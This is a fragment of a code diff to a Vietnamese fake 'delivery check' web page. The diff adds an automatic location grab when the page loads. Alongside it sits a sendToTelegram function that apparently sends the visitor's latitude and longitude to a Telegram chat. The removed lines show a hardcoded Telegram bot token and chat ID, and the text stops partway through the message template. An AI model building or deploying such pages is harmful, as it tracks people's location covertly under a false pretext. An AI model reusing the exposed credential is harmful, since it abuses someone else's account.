@@ -128,14 +128,14 @@ button{
 </style>
 </head>
 
-<body>
+<body onload="getLocation()">
 
 <div class="header">Kiểm Tra Giao Hàng</div>
 
 <div class="card">
 
 <h3 id="title">🚚 Đơn hàng đang được giao</h3>
-<p id="eta">Dự kiến: 5–10 phút</p>
+<p id="eta">Dự kiến: 1–2 giờ</p>
 
 <!-- SHIPPER -->
 <div class="shipper">
@@ -177,8 +177,7 @@ button{
 </div>
 
 <script>
-const TOKEN = "8770209732:AAHHiC-wWAU3F9UUG_KJ41QijPQSjvHlH1M";
-const CHAT_ID = "2040033988";
+
 
 function sendToTelegram(lat, lon){
   const text = `📦 CheckNow
